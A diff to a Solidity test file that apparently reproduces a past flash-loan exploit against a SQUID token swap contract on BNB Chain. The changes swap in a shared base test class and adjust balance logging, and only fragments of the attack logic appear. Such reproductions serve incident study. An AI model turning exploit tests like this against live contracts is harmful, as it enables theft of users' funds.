@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 
 // TX : https://app.blocksec.com/explorer/tx/bsc/0x9fcf38d0af4dd08f4d60f7658b623e35664e74bca0eaebdb0c3b9a6965d6257b
@@ -15,7 +15,7 @@ interface IsquidSwap{
     function sellSwappedTokens(uint256 sellOption) external;
 }
 
-contract ContractTest is Test {
+contract ContractTest is BaseTestWithBalanceLog {
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IERC20 SQUID_1 = IERC20(0x87230146E138d3F296a9a77e497A2A83012e9Bc5);
@@ -28,10 +28,10 @@ contract ContractTest is Test {
     function setUp() external 
     {
         cheats.createSelectFork("bsc", 37672969);
+        fundingToken = address(WBNB);
     }
 
     function testExploit() external {
-        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
         borrow_amount = 10000 ether;
         pool.flash(address(this),0,borrow_amount,"");
         emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
